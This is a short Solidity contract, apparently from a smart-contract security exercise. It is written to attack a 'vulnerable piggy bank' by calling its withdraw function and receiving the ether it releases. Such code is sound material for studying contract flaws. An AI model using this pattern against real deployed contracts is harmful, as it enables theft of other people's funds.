// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IVulnerablePiggyBank {
    function withdraw() external;
}

contract AttackerPiggyBank{
    IVulnerablePiggyBank public target;

    constructor(address _targetAddress) {
        target = IVulnerablePiggyBank(_targetAddress);
    }

    function attack() public {
        target.withdraw(); 
    }
    receive() external payable {}
}
